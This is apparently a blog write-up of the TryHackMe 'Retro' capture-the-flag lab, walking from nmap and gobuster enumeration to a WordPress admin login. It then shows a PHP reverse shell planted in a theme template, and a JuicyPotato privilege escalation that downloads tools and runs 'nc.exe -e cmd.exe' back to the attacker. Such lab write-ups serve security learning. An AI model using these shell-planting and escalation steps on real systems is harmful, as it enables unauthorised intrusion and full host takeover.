+++
title = 'THM: Retro'
date = 2024-09-02T11:15:07+03:00
draft = false
+++

## Initial Scans

### Port Scan

Initial port scan showed open web and RDP ports. Based on the output below the system was detected to be a Windows host running IIS web server.

````
nmap -sV 10.10.214.63

Starting Nmap 7.60 ( https://nmap.org ) at 2024-09-02 09:16 BST
Nmap scan report for ip-10-10-214-63.eu-west-1.compute.internal (10.10.214.63)
Host is up (0.00052s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
MAC Address: 02:F2:D4:2C:99:29 (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.31 seconds
````

### Web Enumeration & Scan

#### / 

Version: IIS httpd 10.0.

The homepage page displays the default ISS page. Enumerated directories using Gobuster.

````
gobuster dir -u http://10.10.214.63 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.214.63
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2024/09/02 09:19:28 Starting gobuster
===============================================================
/retro (Status: 301)
/Retro (Status: 301)
===============================================================
2024/09/02 09:20:06 Finished
===============================================================
````

#### Manual Enumeration

Browsing the web page an interesting comment from user "Wade" is found here:
http://10.10.214.63/retro/index.php/2019/12/09/ready-player-one/#comment-2

````
Leaving myself a note here just in case I forget how to spell it: parzival
````

#### /retro

Scanning /retro with Gobuster shows that the web site is built on a Wordpress instance. 

`````
gobuster dir -u http://10.10.214.63/retro -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.244.218/retro
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2024/09/04 11:11:33 Starting gobuster
===============================================================
/wp-content (Status: 301)
/wp-includes (Status: 301)
/wp-admin (Status: 301)
===============================================================
2024/09/04 11:14:09 Finished
===============================================================
`````

## RDP

Logged in with wage:parzival. The user flag is on the user Wade's desktop.

### Enumeration

No other users except for Administrator.

`````
PS C:\Users\Wade> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
`````

After running winPEAS and LaZagne as Wade and running manual enumeration no clear privilege escalation path was found. At that point another attack path was recognized. 

## Wordpress

Login page can be found from /retro/wp-login.php. Credentials wade:parzival gives an admin access to Wordpress.

### Install Reverse Shell

Webshell was installed using Appearance > Theme Editor > Twenty Sixteen. A PHP reverse shell was installed in 404.php template. 

The shell used can be found from: https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php

````
# Contents of 404.php
<?php
/**
 * The template for displaying 404 pages (not found)
 *
 * @package WordPress
 * @subpackage Twenty_Sixteen
 * @since Twenty Sixteen 1.0
 */

class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;

<omitted for brevity>
````

Launching and receiving the shell was done as shown below.

````
rlwrap nc -nvlp 4444
curl http://10.10.244.218/retro/wp-content/themes/twentysixteen/404.php
````

## OS Enumeration

OS level enumeration was done using the reverse shell.

````
# User
C:\inetpub\wwwroot\retro\wp-content\themes\twentysixteen>whoami
iis apppool\retro

# Privileges
C:\inetpub\wwwroot\retro\wp-content\themes\twentysixteen>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
````

## Privilege Escalation

The user "iis apppool" has SeImpersonatePrivilage enabled which can be used to escalate privileges.

JuicyPotato exploit was used and it can be found from https://github.com/ohpe/juicy-potato. 

````
# Attack machine
rlwrap nc -nvlp 4455
python -m http.server 8000

# Target machine
mkdir C:/transfer
cd C:/transfer
wget http://10.10.168.116:8000/JuicyPotato.exe -OutFile jp.exe
wget http://10.10.168.116:8000/nc.exe -OutFile nc.exe
.\jp.exe -l 4455 -t * -a "/c C:\transfer\nc.exe 10.10.95.172 4455 -e cmd.exe" -p c:\windows\system32\cmd.exe
````

After that the root flag was found from C:/Users/Administrator/Desktop. 

## Lessons Learned
- Remember that web server user might have and often has different privs compared to normal user. This realization cost me some hours. I can but hope to remember this point next time. 
- I hadn't used PHP reverse shell with Wordpress before. That worked like charm and reduced some tedious steps I typically do to establish a reverse shell. This will go in the standard toolbox. 

